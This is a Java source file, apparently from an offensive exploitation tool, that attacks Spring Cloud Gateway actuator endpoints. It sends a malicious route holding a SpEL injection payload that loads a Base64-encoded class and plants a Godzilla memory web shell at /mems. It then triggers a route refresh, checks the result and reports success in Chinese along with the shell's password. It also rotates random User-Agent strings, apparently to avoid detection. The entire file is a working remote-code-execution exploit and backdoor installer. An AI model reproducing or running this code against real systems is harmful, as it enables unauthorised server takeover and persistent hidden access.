package src.main.Exp.ExpCore;

import src.main.LoadLib.MemshellLoad.MemshellLoad;
import src.main.common.UA_Config;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public class ExpCore {
    String address;
    public ExpCore(String address){
        this.address = address;
    }
    public Stream<String> ShellGaw() throws IOException {
        Stream.Builder<String> builder = Stream.builder();
        String res = "";
        String ua = "";
        String refapi = "";
        String api = "";
        String data =
                "{\n" +
                        "  \"id\": \"pwnshell\",\n" +
                        "  \"filters\": [{\n" +
                        "    \"name\": \"AddResponseHeader\",\n" +
                        "    \"args\": {\n" +
                        "      \"name\": \"Result\",\n" +
                        "      \"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass(\\\"GMemShell\\\",T(org.springframework.util.Base64Utils).decodeFromString('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, '/mems')}\"\n" +
                        "    }\n" +
                        "  }],\n" +
                        "  \"uri\": \"http://example.com\"\n" +
                        "}";
        MemshellLoad ms = new MemshellLoad();
        String shell = ms.run();
        String shellData = String.format(data,shell);
        URL obj = new URL(address + "/actuator/env");
        HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
        UA_Config uacf = new UA_Config();
        List<String> ualist = uacf.loadUserAgents();
        ua = uacf.getRandomUserAgent(ualist);
        conn.setRequestProperty("User-Agent",ua);
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        int responseCode = conn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK){
            api = "/actuator/gateway/routes/pwnshell";
            refapi = "/actuator/gateway/refresh";
        }else {
            api = "/gateway/routes/pwnshell";
            refapi = "/gateway/refresh";
        }
        String site = address + api;
        URL obj1 = new URL(site);
        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
        conn1.setRequestMethod("POST");
        conn1.setRequestProperty("Content-Type", "application/json");
        conn1.setDoOutput(true);
        try (OutputStream os = conn1.getOutputStream()) {
            byte[] input = shellData.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }
        int responseCode1 = conn1.getResponseCode();
        if (responseCode1 == HttpURLConnection.HTTP_CREATED){
            String site1 = address + refapi;
            URL obj2 = new URL(site1);
            HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
            conn2.setRequestMethod("POST");
            conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
            conn2.setDoOutput(true);
            int responseCode2 = conn2.getResponseCode();
            if (responseCode2 == HttpURLConnection.HTTP_OK){
                URL obj3 = new URL(site);
                HttpURLConnection conn3 = (HttpURLConnection) obj3.openConnection();
                conn3.setRequestMethod("GET");
                conn3.setDoOutput(true);
                BufferedReader in = new BufferedReader(new InputStreamReader(conn3.getInputStream()));
                String inputLine;
                StringBuilder content = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    content.append(inputLine);
                    res = inputLine.toString();
                }
                int responseCode3 = conn3.getResponseCode();
                if (responseCode3 == HttpURLConnection.HTTP_OK){
                    if (res.contains("pwnshell")) {
                        String resultPattern = "Result\\s*=\\s*'([^\\n]*)'";
                        Pattern pattern = Pattern.compile(resultPattern);
                        Matcher matcher = pattern.matcher(content.toString());
                        if (matcher.find()) {
                            if(matcher.group(1).equals("ok")) {
                                String result = "哥斯拉GetShell成功，访问地址为/mems， 密码为boomhacker";
                                builder.add(result);
                            }else{
                                String result = "已经上传过了，请不要重新上传了\t\t访问地址为/mems， 密码为boomhacker";
                                builder.add(result);
                            }
                        }
                    }else {
                        builder.add(address + "   " + "Getshell失败，请重试");
                    }
                }else{
                    builder.add("POST request failed with response code: " + responseCode1);
                }
            }
        }
        return  builder.build();
    }
}
